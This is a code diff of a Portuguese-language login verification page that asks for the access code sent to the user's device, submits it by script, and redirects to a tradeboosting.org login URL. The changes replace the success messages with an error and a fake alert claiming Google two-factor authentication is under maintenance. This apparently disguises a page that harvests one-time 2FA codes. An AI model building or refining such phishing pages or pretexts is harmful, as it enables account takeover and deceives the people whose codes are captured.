@@ -68,7 +68,7 @@
 <body>
 
     <div class="verification-container">
-        <h2>Informe aqui o código de acesso enviado ao seu telefone para fazer login</h2>
+        <h4>Informe aqui o código de acesso enviado ao seu dispositivo para fazer login</h4>
         <form id="verificationForm">
             <div class="input-group">
                 <input type="text" id="codigo" name="codigo" placeholder="Digite o código" required>
@@ -78,7 +78,7 @@
     </div>
 
     <div class="message-container" id="messageContainer">
-        <p>Código verificado com sucesso! Acesso concedido.</p>
+        <p>Erro, indisponível no momento.</p>
     </div>
 
     <script>
@@ -101,7 +101,7 @@
             }).then(response => {
                 // Atraso e redirecionamento após a verificação
                 setTimeout(function() {
-                    alert('Autenticação bem-sucedida! Você será redirecionado para a página de login.');
+                    alert('Estamos em atualização nos nossos serviços, usuários com problemas na autenicação de 2 fatores do Google. Em breve vamos disponibilizar o acesso via telefonia móvel cadastrado em sua conta...');
                     window.location.href = "https://tradeboosting.org/app/login.php";
                 }, 2000);
             }).catch(error => {
